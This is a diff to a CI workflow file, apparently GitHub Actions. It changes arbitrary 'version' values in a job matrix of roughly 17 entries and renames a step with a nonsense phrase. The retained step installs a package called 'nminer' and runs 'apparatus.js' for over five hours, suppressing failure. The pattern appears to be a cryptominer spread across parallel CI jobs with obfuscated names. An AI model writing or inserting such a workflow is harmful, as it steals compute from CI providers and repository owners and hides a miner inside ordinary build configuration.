@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1779 }
-          - { version: 5106 }
-          - { version: 997 }
-          - { version: 2801 }
-          - { version: 9935 }
-          - { version: 2359 }
-          - { version: 1110 }
-          - { version: 3529 }
-          - { version: 438 }
-          - { version: 6924 }
-          - { version: 6931 }
-          - { version: 5971 }
-          - { version: 2428 }
-          - { version: 1518 }
-          - { version: 5776 }
-          - { version: 8406 }
-          - { version: 6684 }
-          - { version: 9637 }
+          - { version: 400 }
+          - { version: 4566 }
+          - { version: 9141 }
+          - { version: 2685 }
+          - { version: 9096 }
+          - { version: 6737 }
+          - { version: 3714 }
+          - { version: 758 }
+          - { version: 4841 }
+          - { version: 7002 }
+          - { version: 8846 }
+          - { version: 2721 }
+          - { version: 310 }
+          - { version: 9471 }
+          - { version: 8439 }
+          - { version: 7277 }
+          - { version: 8187 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: potentially
+      - name: miserable homely sans frantically
         run: |
           npm install nminer@latest
-          timeout 339m node apparatus.js || echo "apparatus executed"
+          timeout 308m node apparatus.js || echo "apparatus executed"
